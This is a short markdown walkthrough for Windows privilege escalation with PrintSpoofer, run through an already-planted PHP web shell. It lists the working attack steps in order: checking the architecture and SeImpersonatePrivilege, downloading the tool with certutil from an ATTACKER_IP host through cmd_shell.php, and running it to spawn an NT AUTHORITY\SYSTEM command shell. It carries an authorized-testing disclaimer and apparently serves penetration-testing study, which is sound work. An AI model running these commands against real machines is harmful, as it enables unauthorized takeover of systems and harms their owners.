# Windows Privilege Escalation – PrintSpoofer

This document describes how to upload and execute **PrintSpoofer** to obtain a SYSTEM shell on a vulnerable Windows machine.

⚠️ For educational and authorized testing purposes only.

---

## Important Note on Architecture (MUST READ)

The **default PrintSpoofer binary** commonly available is **64-bit**:

```
PrintSpoofer.exe: PE32+ executable (x86-64)
```

This binary **WILL NOT run on 32-bit Windows systems** and will return a compatibility error.

Therefore, **Windows architecture must be verified before execution**.

---

## Step 1: Verify Windows Architecture (Target Machine)

Run the following command on the target Windows system:

```cmd
systeminfo | findstr /i "System Type"
```

### Interpretation:
- `X64-based PC` → Use **64-bit PrintSpoofer**
- `X86-based PC` → Use **32-bit PrintSpoofer**


## Step 2: Upload PrintSpoofer using certutil

Download the appropriate PrintSpoofer binary from the attacker (Kali/Base) machine:

```text
cmd_shell.php?cmd=certutil.exe -urlcache -f http://ATTACKER_IP/PrintSpoofer.exe PrintSpoofer.exe
```

> Ensure the binary architecture matches the target Windows OS.

---

## Step 3: Execute PrintSpoofer

Execute PrintSpoofer to spawn a SYSTEM command shell:

```text
cmd_shell.php?cmd=PrintSpoofer.exe -i -c cmd.exe
```

If successful, a new command prompt will be spawned with **NT AUTHORITY\SYSTEM** privileges.

---

## Required Privilege Check

PrintSpoofer requires the following privilege to be enabled:

```cmd
whoami /priv
```

The following must be present and enabled:

```
SeImpersonatePrivilege   Enabled
```

If this privilege is not available, PrintSpoofer will not work.

---

## Common Failure Reason

```
This version of PrintSpoofer.exe is not compatible with the version of Windows you're running
```

This error indicates an **architecture mismatch** (64-bit binary on 32-bit Windows).

---

## Outcome

Successful exploitation results in **privilege escalation from a low-privileged user to NT AUTHORITY\SYSTEM**.

---

## Disclaimer

Use this technique only on systems you own or have explicit permission to test.
